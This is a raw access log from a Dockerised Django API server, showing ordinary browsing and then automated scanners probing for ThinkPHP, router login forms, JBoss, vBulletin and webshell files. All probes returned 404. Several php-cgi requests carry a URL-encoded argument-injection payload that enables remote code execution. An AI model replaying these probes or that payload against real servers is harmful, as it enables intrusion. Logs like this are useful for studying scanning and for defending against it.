+[36mweb_1  |[0m Not Found: /favicon.ico
+[36mweb_1  |[0m 54.145.3.68 - - [21/Sep/2020:06:41:36 +0000] "GET /favicon.ico HTTP/1.1" 404 2465 "-" "Slackbot 1.0 (+https://api.slack.com/robots)"
+[36mweb_1  |[0m Not Found: /cgi-bin/ViewLog.asp
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:29 +0000] "GET /cgi-bin/ViewLog.asp HTTP/1.1" 404 2489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:33 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /api/v1/ HTTP/1.1" 200 10980 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:35 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [21/Sep/2020:06:44:36 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /TP/public/index.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:19 +0000] "GET /TP/public/index.php HTTP/1.1" 404 2489 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /TP/index.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:20 +0000] "GET /TP/index.php HTTP/1.1" 404 2468 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /thinkphp/html/public/index.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:20 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2522 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /html/public/index.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:21 +0000] "GET /html/public/index.php HTTP/1.1" 404 2495 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /public/index.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:23 +0000] "GET /public/index.php HTTP/1.1" 404 2480 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /TP/html/public/index.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:23 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 2504 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /elrekt.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:25 +0000] "GET /elrekt.php HTTP/1.1" 404 2462 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /index.php
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:25 +0000] "GET /index.php HTTP/1.1" 404 2459 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 106.13.37.118 - - [21/Sep/2020:06:54:26 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /HNAP1/
+[36mweb_1  |[0m 120.59.242.102 - - [21/Sep/2020:07:29:10 +0000] "POST /HNAP1/ HTTP/1.0" 404 2454 "-" "-"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 45.148.10.65 - - [21/Sep/2020:07:36:55 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2505 "http://206.189.68.96:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+[36mweb_1  |[0m Not Found: /goform/webLogin
+[36mweb_1  |[0m 185.132.53.222 - - [21/Sep/2020:08:08:18 +0000] "POST /goform/webLogin HTTP/1.1" 404 2481 "http://206.189.68.96:80/login_inter.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 190.128.154.222 - - [21/Sep/2020:08:21:19 +0000] "HEAD / HTTP/1.1" 404 2415 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 190.128.154.222 - - [21/Sep/2020:08:21:20 +0000] "GET / HTTP/1.1" 404 2414 "-" "-"
+[36mweb_1  |[0m Not Found: /invoker/EJBInvokerServlet
+[36mweb_1  |[0m 190.128.154.222 - - [21/Sep/2020:08:21:21 +0000] "HEAD /invoker/EJBInvokerServlet HTTP/1.1" 404 2508 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 34.201.153.104 - - [21/Sep/2020:09:23:21 +0000] "GET / HTTP/1.1" 404 2414 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 52.203.117.144 - - [21/Sep/2020:09:24:30 +0000] "GET / HTTP/1.1" 404 2414 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
+[36mweb_1  |[0m Not Found: /clientaccesspolicy.xml
+[36mweb_1  |[0m 34.201.153.104 - - [21/Sep/2020:09:29:47 +0000] "GET /clientaccesspolicy.xml HTTP/1.1" 404 2498 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
+[36mweb_1  |[0m Not Found: /clientaccesspolicy.xml
+[36mweb_1  |[0m 52.203.117.144 - - [21/Sep/2020:09:33:09 +0000] "GET /clientaccesspolicy.xml HTTP/1.1" 404 2498 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:37 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)"
+[36mweb_1  |[0m Not Found: /robots.txt
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:37 +0000] "GET /robots.txt HTTP/1.1" 404 2462 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)"
+[36mweb_1  |[0m Not Found: /Admin6044bdce/Login.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:41 +0000] "POST /Admin6044bdce/Login.php HTTP/1.1" 404 2502 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:41 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+[36mweb_1  |[0m Not Found: /l.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:45 +0000] "GET /l.php HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+[36mweb_1  |[0m Not Found: /phpinfo.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:45 +0000] "GET /phpinfo.php HTTP/1.1" 404 2465 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+[36mweb_1  |[0m Not Found: /index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:49 +0000] "POST /index.php HTTP/1.1" 404 2460 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
+[36mweb_1  |[0m Not Found: /bbs.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:49 +0000] "POST /bbs.php HTTP/1.1" 404 2454 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
+[36mweb_1  |[0m Not Found: /forums.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:53 +0000] "POST /forums.php HTTP/1.1" 404 2463 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
+[36mweb_1  |[0m Not Found: /bbs/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:53 +0000] "POST /bbs/index.php HTTP/1.1" 404 2472 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
+[36mweb_1  |[0m Not Found: /forums/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:57 +0000] "POST /forums/index.php HTTP/1.1" 404 2481 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
+[36mweb_1  |[0m Not Found: /ajax/render/widget_tabbedcontainer_tab_panel
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:40:57 +0000] "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 404 2565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
+[36mweb_1  |[0m Not Found: /forum/ajax/render/widget_tabbedcontainer_tab_panel
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:01 +0000] "POST /forum/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 404 2583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
+[36mweb_1  |[0m Not Found: /forums/ajax/render/widget_tabbedcontainer_tab_panel
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:01 +0000] "POST /forums/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 404 2586 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
+[36mweb_1  |[0m Not Found: /cgi-bin/php5
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:05 +0000] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 3035 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+[36mweb_1  |[0m Not Found: /cgi-bin/php-cgi
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:05 +0000] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+[36mweb_1  |[0m Not Found: /cgi-bin/php4
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:09 +0000] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 3035 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+[36mweb_1  |[0m Not Found: /base/post.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:09 +0000] "POST /%62%61%73%65/%70%6F%73%74%2E%70%68%70 HTTP/1.1" 404 2472 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+[36mweb_1  |[0m Not Found: /webdav/
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:10 +0000] "GET /webdav/ HTTP/1.1" 404 2456 "-" "Mozilla/5.0"
+[36mweb_1  |[0m Not Found: /ispirit/im/upload.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:13 +0000] "GET /%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70 HTTP/1.1" 404 2495 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /help.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:13 +0000] "GET /help.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /java.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:14 +0000] "GET /java.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /_query.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:17 +0000] "GET /_query.php HTTP/1.1" 404 2462 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /test.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:17 +0000] "GET /test.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /db_cts.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:18 +0000] "GET /db_cts.php HTTP/1.1" 404 2462 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /logon.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:25 +0000] "GET /logon.php HTTP/1.1" 404 2459 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /help-e.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:25 +0000] "GET /help-e.php HTTP/1.1" 404 2462 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /license.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:26 +0000] "GET /license.php HTTP/1.1" 404 2465 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /log.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:29 +0000] "GET /log.php HTTP/1.1" 404 2453 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /hell.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:29 +0000] "GET /hell.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /pmd_online.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:30 +0000] "GET /pmd_online.php HTTP/1.1" 404 2474 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /x.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:33 +0000] "GET /x.php HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /shell.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:33 +0000] "GET /shell.php HTTP/1.1" 404 2459 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /htdocs.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:34 +0000] "GET /htdocs.php HTTP/1.1" 404 2462 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /b.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:37 +0000] "GET /b.php HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /sane.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:37 +0000] "GET /sane.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /desktop.ini.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:38 +0000] "GET /desktop.ini.php HTTP/1.1" 404 2477 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /z.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:41 +0000] "GET /z.php HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /lala.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:41 +0000] "GET /lala.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /wpo.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:49 +0000] "GET /wpo.php HTTP/1.1" 404 2453 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /muhstik.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:53 +0000] "GET /muhstik.php HTTP/1.1" 404 2465 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /text.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:53 +0000] "GET /text.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /wp-config.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:54 +0000] "GET /wp-config.php HTTP/1.1" 404 2471 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /muhstik.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:57 +0000] "GET /muhstik.php HTTP/1.1" 404 2465 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /muhstik2.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:57 +0000] "GET /muhstik2.php HTTP/1.1" 404 2468 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /muhstiks.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:41:58 +0000] "GET /muhstiks.php HTTP/1.1" 404 2468 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /muhstik-dpr.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:01 +0000] "GET /muhstik-dpr.php HTTP/1.1" 404 2477 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /lol.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:01 +0000] "GET /lol.php HTTP/1.1" 404 2453 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /uploader.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:02 +0000] "GET /uploader.php HTTP/1.1" 404 2468 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /cmv.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:05 +0000] "GET /cmv.php HTTP/1.1" 404 2453 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /cmdd.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:05 +0000] "GET /cmdd.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /knal.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:06 +0000] "GET /knal.php HTTP/1.1" 404 2456 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /cmd.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:06 +0000] "GET /cmd.php HTTP/1.1" 404 2453 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /shell.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:42:06 +0000] "GET /shell.php HTTP/1.1" 404 2459 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+[36mweb_1  |[0m Not Found: /scripts/setup.php
